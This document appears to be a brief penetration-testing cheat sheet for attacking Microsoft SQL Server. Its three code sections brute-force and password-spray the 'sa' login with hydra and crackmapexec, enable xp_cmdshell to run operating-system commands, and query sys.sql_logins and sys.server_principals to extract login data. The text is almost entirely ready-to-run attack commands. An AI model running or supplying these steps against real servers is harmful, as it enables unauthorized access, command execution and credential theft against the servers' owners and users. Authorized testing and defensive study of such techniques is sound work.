
## 1-credential-based Access

```bash
# Brute force SA account
hydra -l sa -P passwords.txt mssql://target

# Password spraying
crackmapexec mssql target -u users.txt -p passwords.txt
```


## 2-command Execution

```bash
# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# Execute commands
SQL> EXEC xp_cmdshell 'whoami';
```


## 3-Data Extraction

```bash
# Extract sensitive data
SQL> SELECT * FROM sys.sql_logins;

# Access system databases
SQL> USE master;
SQL> SELECT * FROM sys.server_principals;
```
